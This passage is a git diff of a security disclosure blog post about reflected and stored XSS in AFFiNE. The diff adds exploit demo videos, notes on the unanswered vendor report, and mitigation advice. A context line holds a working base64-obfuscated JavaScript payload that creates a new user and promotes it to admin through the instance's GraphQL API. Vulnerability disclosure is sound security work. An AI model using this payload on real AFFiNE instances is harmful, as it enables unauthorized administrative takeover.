@@ -150,16 +150,19 @@ Since cookies are **HttpOnly**, stealing them directly isn't an option, but we c
 This script **creates a new user, promotes them to admin and enables all features**, giving full control over the instance.
 
 For the **0-Click Reflected XSS**, you can embed this script inside the SVG, serve it from your webhook and send it to the victim.
+<video controls src="/assets/videos/reflected-xss-affine.webm" title="Exploit PoC"></video>
 
 For the **Stored XSS**, you need an account on the AFFiNE instance and share a document containing the malicious link with the victim. When they click it, the code runs, which is basically the same exploit but base64 encoded for convenience:
 ```js
 javascript:eval(atob("KGFzeW5jICgpID0+IHsKY29uc3QgdXJsID0gImh0dHBzOi8ve3tBRkZJTkVfVVJMfX0vZ3JhcGhxbCIKYXN5bmMgZnVuY3Rpb24gc2VuZFJlcXVlc3QocGF5bG9hZCwgb3BlcmF0aW9uTmFtZSkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKHVybCwgewogICAgICAgICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgICAgICJYLU9wZXJhdGlvbi1OYW1lIjogb3BlcmF0aW9uTmFtZSwKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgICAgICB9KTsKICAgICAgICByZXR1cm4gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCdFcnJvcjonLCBlcnJvcik7CiAgICB9Cn0KCmNvbnN0IGNyZWF0ZVVzZXJQYXlsb2FkID0gewogICAgInF1ZXJ5IjoibXV0YXRpb24gY3JlYXRlVXNlcigkaW5wdXQ6IENyZWF0ZVVzZXJJbnB1dCEpIHtcbiAgY3JlYXRlVXNlcihpbnB1dDogJGlucHV0KSB7XG4gICAgaWRcbiAgfVxufSIsCiAgICAidmFyaWFibGVzIjp7ImlucHV0Ijp7Im5hbWUiOiJ4c3MiLCJlbWFpbCI6Inhzc0B4c3MueHNzIiwicGFzc3dvcmQiOiIxMjM0NTY3OCJ9fSwKICAgICJvcGVyYXRpb25OYW1lIjoiY3JlYXRlVXNlciIKfTsKCmNvbnN0IGNyZWF0ZVVzZXJSZXNwb25zZSA9IGF3YWl0IHNlbmRSZXF1ZXN0KGNyZWF0ZVVzZXJQYXlsb2FkLCAiY3JlYXRlVXNlciIpOwpjb25zdCB1cGRhdGVBY2NvdW50UGF5bG9hZCA9IHsKICAgICJxdWVyeSI6Im11dGF0aW9uIHVwZGF0ZUFjY291bnRGZWF0dXJlcygkdXNlcklkOiBTdHJpbmchLCAkZmVhdHVyZXM6IFtGZWF0dXJlVHlwZSFdISkge1xuICB1cGRhdGVVc2VyRmVhdHVyZXMoaWQ6ICR1c2VySWQsIGZlYXR1cmVzOiAkZmVhdHVyZXMpXG59IiwKICAgICJ2YXJpYWJsZXMiOnsidXNlcklkIjpjcmVhdGVVc2VyUmVzcG9uc2UuZGF0YS5jcmVhdGVVc2VyLmlkLCJmZWF0dXJlcyI6WyJBZG1pbiIsIkVhcmx5QWNjZXNzIiwiVW5saW1pdGVkQ29waWxvdCIsIkFJRWFybHlBY2Nlc3MiXX0sCiAgICAib3BlcmF0aW9uTmFtZSI6InVwZGF0ZUFjY291bnRGZWF0dXJlcyIKfTsKCmF3YWl0IHNlbmRSZXF1ZXN0KHVwZGF0ZUFjY291bnRQYXlsb2FkLCAidXBkYXRlQWNjb3VudEZlYXR1cmVzIik7Cn0pKCk7"))
 ```
 
+<video controls src="/assets/videos/stored-xss-affine.webm" title="Exploit PoC"></video>
+
 ## Reporting
 
 This is the frustrating part of this post. I was **completely ignored** by the AFFiNE team. They push commits every day, so I'm pretty sure they saw my report, they just **ghosted me** without even acknowledging the issue, showing zero interest in their users' security. These vulnerabilities could easily be **exploited in the wild**, especially on **affine.pro**, their cloud version.
-I warned them that if I didn't get a response by **March 15th** I would go public, and still nothing.
+I warned them that if I didn't get a response by **March 15th** I would go public, hoping this pressure would make them fix it and still nothing.
 
 I'll be filing the vulnerability through **MITRE** since getting a CVE assigned on GitHub requires the repo maintainers to confirm it.
 
@@ -171,4 +174,5 @@ I'll be filing the vulnerability through **MITRE** since getting a CVE assigned 
 
 ## Conclusion
 Thanks to everyone who read this post, and a big thank you again to [Salvatore](https://x.com/salvatoreabello) for his contribution.
+If you are hosting an AFFiNE istance, use a proxy to block access to the vulnerable endpoint (`/api/worker/image-proxy/image-proxy?url=`) until this gets patched, and be careful with any links you click inside the editor if you work it with untrusted users.
 I hope this reaches as many people as possible so we can put some pressure on the AFFiNE team to actually patch these vulnerabilities.
